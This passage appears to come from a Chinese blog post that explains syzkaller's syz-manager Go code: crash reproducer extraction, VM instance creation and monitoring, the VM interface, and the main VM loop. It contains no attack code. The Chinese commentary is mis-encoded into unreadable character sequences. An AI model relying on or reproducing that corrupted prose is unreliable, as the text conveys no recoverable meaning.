err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆä¼šå»é™¤æ‰å‘ç”Ÿ<code>crash</code>ä¹‹åæ‰§è¡Œçš„ç¨‹åºï¼Œéšåè°ƒç”¨<code>ctx.extractProg</code>è·å–è§¦å‘<code>crash</code>çš„é›†åˆï¼Œæ¥ç€è°ƒç”¨<code>ctx.minimizeProg</code>å°è¯•æœ€å°åŒ–ç¨‹åºé›†åˆï¼Œè°ƒç”¨<code>ctx.extractC</code>å‡½æ•°å°è¯•åœ¨ä¸ç®€åŒ–é…ç½®çš„æƒ…å†µä¸‹æå–<code>C repro</code>ï¼Œç„¶åè°ƒç”¨<code>ctx.simplifyProg</code>ç®€åŒ–é…ç½®å¹¶å°è¯•æå–<code>C repro</code>ï¼Œæœ€åè°ƒç”¨<code>ctx.simplifyC</code>ç®€åŒ–Cç›¸å…³é…ç½®ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *context)</span> <span class="title">extractProg</span><span class="params">(entries []*prog.LogEntry)</span> <span class="params">(*Result, error)</span></span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">2</span>, <span class="string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="built_in">len</span>(entries))</span><br><span class="line">start := time.Now()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ctx.stats.ExtractProgTime = time.Since(start)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract last program on every proc.</span></span><br><span class="line">procs := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="keyword">for</span> i, ent := <span class="keyword">range</span> entries &#123;</span><br><span class="line">procs[ent.Proc] = i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> indices []<span class="keyword">int</span></span><br><span class="line"><span class="keyword">for</span> _, idx := <span class="keyword">range</span> procs &#123;</span><br><span class="line">indices = <span class="built_in">append</span>(indices, idx)</span><br><span class="line">&#125;</span><br><span class="line">sort.Ints(indices)</span><br><span class="line"><span class="keyword">var</span> lastEntries []*prog.LogEntry</span><br><span class="line"><span class="keyword">for</span> i := <span class="built_in">len</span>(indices) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">lastEntries = <span class="built_in">append</span>(lastEntries, entries[indices[i]])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, timeout := <span class="keyword">range</span> ctx.testTimeouts &#123;</span><br><span class="line"><span class="comment">// Execute each program separately to detect simple crashes caused by a single program.</span></span><br><span class="line"><span class="comment">// Programs are executed in reverse order, usually the last program is the guilty one.</span></span><br><span class="line">res, err := ctx.extractProgSingle(lastEntries, timeout)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="built_in">len</span>(res.Prog.Calls))</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Don&#x27;t try bisecting if there&#x27;s only one entry.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(entries) == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute all programs and bisect the log to find multiple guilty programs.</span></span><br><span class="line">res, err = ctx.extractProgBisect(entries, timeout)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="built_in">len</span>(res.Prog.Calls))</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;failed to extract reproducer&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°å¼€å§‹ä½ç½®é¦–å…ˆå°†ç¨‹åºé€†åºï¼Œéšåè°ƒç”¨<code>ctx.extractProgSingle</code>é€ä¸ªè¿è¡Œå•ä¸ªç¨‹åºï¼Œå¦‚æœé‡åˆ°<code>crash</code>åˆ™ç«‹åˆ»è¿”å›ï¼ˆä¸€èˆ¬æ¥è¯´éƒ½æ˜¯æœ€åä¸€ä¸ªç¨‹åºå¼•èµ·çš„ï¼‰ã€‚å¦‚æœæ²¡èƒ½æ‰¾åˆ°åˆ™ä¼šè¿›å…¥åˆ°ä¸‹é¢çš„åˆ¤æ–­ä¸­ï¼Œå¦‚æœç¨‹åºä¸ªæ•°ä¸ä¸º1åˆ™ä¼šè¿›å…¥åˆ°<code>ctx.extractProgBisect</code>å‡½æ•°è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾æ‰¾å‡º<code>crash</code>ç¨‹åºé›†åˆã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> !canRepro() &#123;</span><br><span class="line">  idx := instances.TakeOne()</span><br><span class="line">  <span class="keyword">if</span> idx == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: starting instance %v&quot;</span>, *idx)</span><br><span class="line">  <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    crash, err := mgr.runInstance(*idx)</span><br><span class="line">    runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;</span><br><span class="line">  &#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨çœ‹å‰é¢çš„ä¸¤ä¸ªå°å¾ªç¯ä¸­çš„ç¬¬äºŒä¸ªå¾ªç¯ï¼Œç¬¬äºŒä¸ªå¾ªç¯çš„æ¡ä»¶ä¸ºä¸èƒ½è¿›è¡Œ<code>crash</code>å¤ç°ï¼Œæ‰€ä»¥è¿™é‡Œè¿›å…¥åç¨‹å°†å‰©ä½™çš„VMè°ƒåº¦å»fuzzå¹¶å°†ç»“æœè¾“å‡ºåˆ°<code>runDone</code>ä¸­å»ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runInstance</span><span class="params">(index <span class="keyword">int</span>)</span> <span class="params">(*Crash, error)</span></span> &#123;</span><br><span class="line">mgr.checkUsedFiles()</span><br><span class="line">instanceName := fmt.Sprintf(<span class="string">&quot;vm-%d&quot;</span>, index)</span><br><span class="line"></span><br><span class="line">rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)</span><br><span class="line"></span><br><span class="line">machineInfo := mgr.serv.shutdownInstance(instanceName)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(vmInfo) != <span class="number">0</span> &#123;</span><br><span class="line">machineInfo = <span class="built_in">append</span>(<span class="built_in">append</span>(vmInfo, <span class="string">&#x27;\n&#x27;</span>), machineInfo...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Error that is not a VM crash.</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// No crash.</span></span><br><span class="line"><span class="keyword">if</span> rep == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">crash := &amp;Crash&#123;</span><br><span class="line">vmIndex:     index,</span><br><span class="line">hub:         <span class="literal">false</span>,</span><br><span class="line">Report:      rep,</span><br><span class="line">machineInfo: machineInfo,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> crash, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å®é™…è°ƒç”¨çš„æ˜¯<code>mgr.runInstanceInner</code>å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runInstanceInner</span><span class="params">(index <span class="keyword">int</span>, instanceName <span class="keyword">string</span>)</span> <span class="params">(*report.Report, []<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">inst, err := mgr.vmPool.Create(index)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to create instance: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> inst.Close()</span><br><span class="line"></span><br><span class="line">fwdAddr, err := inst.Forward(mgr.serv.port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to setup port forwarding: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to copy binary: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If ExecutorBin is provided, it means that syz-executor is already in the image,</span></span><br><span class="line"><span class="comment">// so no need to copy it.</span></span><br><span class="line">executorBin := mgr.sysTarget.ExecutorBin</span><br><span class="line"><span class="keyword">if</span> executorBin == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to copy binary: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fuzzerV := <span class="number">0</span></span><br><span class="line">procs := mgr.cfg.Procs</span><br><span class="line"><span class="keyword">if</span> *flagDebug &#123;</span><br><span class="line">fuzzerV = <span class="number">100</span></span><br><span class="line">procs = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run the fuzzer binary.</span></span><br><span class="line">start := time.Now()</span><br><span class="line">atomic.AddUint32(&amp;mgr.numFuzzing, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="keyword">uint32</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">args := &amp;instance.FuzzerCmdArgs&#123;</span><br><span class="line">Fuzzer:    fuzzerBin,</span><br><span class="line">Executor:  executorBin,</span><br><span class="line">Name:      instanceName,</span><br><span class="line">OS:        mgr.cfg.TargetOS,</span><br><span class="line">Arch:      mgr.cfg.TargetArch,</span><br><span class="line">FwdAddr:   fwdAddr,</span><br><span class="line">Sandbox:   mgr.cfg.Sandbox,</span><br><span class="line">Procs:     procs,</span><br><span class="line">Verbosity: fuzzerV,</span><br><span class="line">Cover:     mgr.cfg.Cover,</span><br><span class="line">Debug:     *flagDebug,</span><br><span class="line">Test:      <span class="literal">false</span>,</span><br><span class="line">Runtest:   <span class="literal">false</span>,</span><br><span class="line">Optional: &amp;instance.OptionalFuzzerArgs&#123;</span><br><span class="line">Slowdown:   mgr.cfg.Timeouts.Slowdown,</span><br><span class="line">RawCover:   mgr.cfg.RawCover,</span><br><span class="line">SandboxArg: mgr.cfg.SandboxArg,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmd := instance.FuzzerCmd(args)</span><br><span class="line">outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to run fuzzer: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vmInfo []<span class="keyword">byte</span></span><br><span class="line">rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)</span><br><span class="line"><span class="keyword">if</span> rep == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// This is the only &quot;OK&quot; outcome.</span></span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">vmInfo, err = inst.Info()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">vmInfo = []<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;error getting VM info: %v\n&quot;</span>, err))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rep, vmInfo, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆè°ƒç”¨<code>mgr.vmPool.Create</code>åˆ›å»ºVMï¼Œéšåè°ƒç”¨<code>inst.Forward</code>è¿›è¡ŒTCPè½¬å‘ï¼Œç„¶åé€šè¿‡<code>inst.Copy</code>æ‹·è´<code>syz-fuzzer</code>å’Œ<code>syz-executor</code>åˆ°VMæ–‡ä»¶ç³»ç»Ÿä¸‹ã€‚éšåè°ƒç”¨<code>instance.FuzzerCmd</code>å‡½æ•°ç”Ÿæˆå‘½ä»¤è¡Œåè°ƒç”¨<code>inst.Run</code>å‡½æ•°å¯åŠ¨<code>syz-fuzzer</code>ï¼Œéšåè°ƒç”¨<code>inst.MonitorExecution</code>ç›‘è§†VMè¿è¡Œï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯é€šè¿‡è·å–<code>kernel oops</code>æ¥åˆ¤æ–­æ˜¯å¦å‡ºç°äº†<code>crash</code>ã€‚</p><p>è¿™é‡Œæä¸€ä¸‹vmå®ä¾‹ï¼Œåœ¨<code>syz-manaer</code>ä¸­çš„vmå®ä¾‹å…¶å®æ˜¯å¦‚ä¸‹ç»“æ„ä½“è¡¨ç¤ºçš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Instance <span class="keyword">struct</span> &#123;</span><br><span class="line">impl     vmimpl.Instance</span><br><span class="line">workdir  <span class="keyword">string</span></span><br><span class="line">timeouts targets.Timeouts</span><br><span class="line">index    <span class="keyword">int</span></span><br><span class="line">onClose  <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶éœ€è¦å®šä¹‰ä¸€äº›<code>interface</code>æ¥å£</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Instance <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Copy copies a hostSrc file into VM and returns file name in VM.</span></span><br><span class="line">Copy(hostSrc <span class="keyword">string</span>) (<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Forward sets up forwarding from within VM to the given tcp</span></span><br><span class="line"><span class="comment">// port on the host and returns the address to use in VM.</span></span><br><span class="line">Forward(port <span class="keyword">int</span>) (<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run runs cmd inside of the VM (think of ssh cmd).</span></span><br><span class="line"><span class="comment">// outc receives combined cmd and kernel console output.</span></span><br><span class="line"><span class="comment">// errc receives either command Wait return error or vmimpl.ErrTimeout.</span></span><br><span class="line"><span class="comment">// Command is terminated after timeout. Send on the stop chan can be used to terminate it earlier.</span></span><br><span class="line">Run(timeout time.Duration, stop &lt;-<span class="keyword">chan</span> <span class="keyword">bool</span>, command <span class="keyword">string</span>) (outc &lt;-<span class="keyword">chan</span> []<span class="keyword">byte</span>, errc &lt;-<span class="keyword">chan</span> error, err error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Diagnose retrieves additional debugging info from the VM</span></span><br><span class="line"><span class="comment">// (e.g. by sending some sys-rq&#x27;s or SIGABORT&#x27;ing a Go program).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Optionally returns (some or all) of the info directly. If wait == true,</span></span><br><span class="line"><span class="comment">// the caller must wait for the VM to output info directly to its log.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// rep describes the reason why Diagnose was called.</span></span><br><span class="line">Diagnose(rep *report.Report) (diagnosis []<span class="keyword">byte</span>, wait <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close stops and destroys the VM.</span></span><br><span class="line">Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  <code>Copy()</code>ï¼šå°†ä¸€ä¸ªæ¥è‡ªå®¿ä¸»æœºçš„æ–‡ä»¶æ‹·è´è‡³è™šæ‹Ÿæœºä¸­ï¼Œè¿”å›è™šæ‹Ÿæœºä¸­çš„æ–‡ä»¶å</p><p>  <code>Forward()</code>ï¼šè®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œå¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€</p><p>  <code>Run()</code>ï¼šåœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤</p><p>  <code>Diagnose()</code>ï¼šåœ¨è™šæ‹Ÿæœºä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</p><p>  <code>Close()</code>ï¼šåœæ­¢å¹¶é”€æ¯è™šæ‹Ÿæœº</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçš„<code>guest VM</code>æ‰€å®ç°çš„<code>interface</code>æ˜¯ä¸åŒçš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">vmLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">for</span> shutdown != <span class="literal">nil</span> || instances.Len() != vmCount &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">var</span> stopRequest <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;</span><br><span class="line">stopRequest = mgr.vmStop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait:</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-instances.Freed:</span><br><span class="line"><span class="comment">// An instance has been released.</span></span><br><span class="line"><span class="keyword">case</span> stopRequest &lt;- <span class="literal">true</span>:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: issued stop request&quot;</span>)</span><br><span class="line">stopPending = <span class="literal">true</span></span><br><span class="line"><span class="keyword">case</span> res := &lt;-runDone:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> res.err != <span class="literal">nil</span> &amp;&amp; shutdown != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;%v&quot;</span>, res.err)</span><br><span class="line">&#125;</span><br><span class="line">stopPending = <span class="literal">false</span></span><br><span class="line">instances.Put(res.idx)</span><br><span class="line"><span class="comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span></span><br><span class="line"><span class="comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span></span><br><span class="line"><span class="keyword">if</span> shutdown != <span class="literal">nil</span> &amp;&amp; res.crash != <span class="literal">nil</span> &#123;</span><br><span class="line">needRepro := mgr.saveCrash(res.crash)</span><br><span class="line"><span class="keyword">if</span> needRepro &#123;</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)</span><br><span class="line">pendingRepro[res.crash] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> res := &lt;-reproDone:</span><br><span class="line">atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="keyword">uint32</span>(<span class="number">0</span>))</span><br><span class="line">crepro := <span class="literal">false</span></span><br><span class="line">title := <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> res.repro != <span class="literal">nil</span> &#123;</span><br><span class="line">crepro = res.repro.CRepro</span><br><span class="line">title = res.repro.Report.Title</span><br><span class="line">&#125;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,</span><br><span class="line">res.instances, res.report0.Title, res.repro != <span class="literal">nil</span>, crepro, title)</span><br><span class="line"><span class="keyword">if</span> res.err != <span class="literal">nil</span> &#123;</span><br><span class="line">reportReproError(res.err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">delete</span>(reproducing, res.report0.Title)</span><br><span class="line"><span class="keyword">if</span> res.repro == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !res.hub &#123;</span><br><span class="line">mgr.saveFailedRepro(res.report0, res.stats)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mgr.saveRepro(res)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-shutdown:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: shutting down...&quot;</span>)</span><br><span class="line">shutdown = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> crash := &lt;-mgr.hubReproQueue:</span><br><span 